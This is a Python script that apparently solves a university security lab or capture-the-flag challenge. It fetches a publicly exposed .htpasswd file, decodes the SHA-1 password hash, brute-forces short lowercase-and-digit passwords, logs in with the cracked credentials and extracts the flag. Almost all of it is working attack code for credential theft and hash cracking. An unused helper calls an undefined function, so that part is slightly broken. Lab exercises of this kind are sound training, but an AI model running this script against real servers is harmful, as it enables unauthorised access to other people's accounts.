import re
import requests
import string
import itertools
import hashlib

URL = "https://t16-e903940d62c9a6c1.itsec.sec.in.tum.de"

sha1_basis_64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
def base64_decode(h: str):
    h = h.rstrip("=") # Remove padding
    conversion_num = [sha1_basis_64.index(x) for x in h]

    leftchar = 0
    leftbits  = 0
    out = bytearray()
    while conversion_num:
        i = conversion_num.pop(0)
        leftchar = leftchar << 6 | i
        leftbits += 6
        if leftbits >= 8:
            leftbits -= 8
            out.append(leftchar >> leftbits)
            leftchar &= ((1 << leftbits) -1)
    return bytes(out)

def sha1_hash(username, password):
    sha1_hash = hashlib.sha1(password.encode()).digest()
    encoded_sha1_hash = base64_encode(sha1_hash, sha1_basis_64)
    return f"{username}:{{SHA}}{encoded_sha1_hash}"

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

with requests.Session() as sess:

    resp = sess.get(URL + "/.htpasswd")
    htpasswd_content = resp.text

    username = ""
    target_hash = ""
    for line in htpasswd_content.strip().split('\n'):
        username, pwdata = line.split(':', 1)
        if pwdata.startswith('{SHA}'):
            target_hash = base64_decode(pwdata[5:])
            break
    
    print(f"\nCracking password for {username}...")
    charset = string.ascii_lowercase + string.digits
    password = None
    
    for combo in itertools.product(charset, repeat=5):
        pw = ''.join(combo)
        h = hashlib.sha1(pw.encode()).digest()
        if h == target_hash:
            password = pw
            break

    if password:
        print(f"Found password: {password}")
        
        # Login with cracked credentials
        resp = sess.post(URL + "/", data={
            "username": username,
            "password": password
        })
        
        flag = extract_flag_from_string(resp.text)
        if flag:
            print(f"FLAG: {flag}")
        else:
            print("Login failed:", resp.text[:500])
    else:
        print("Password not found")


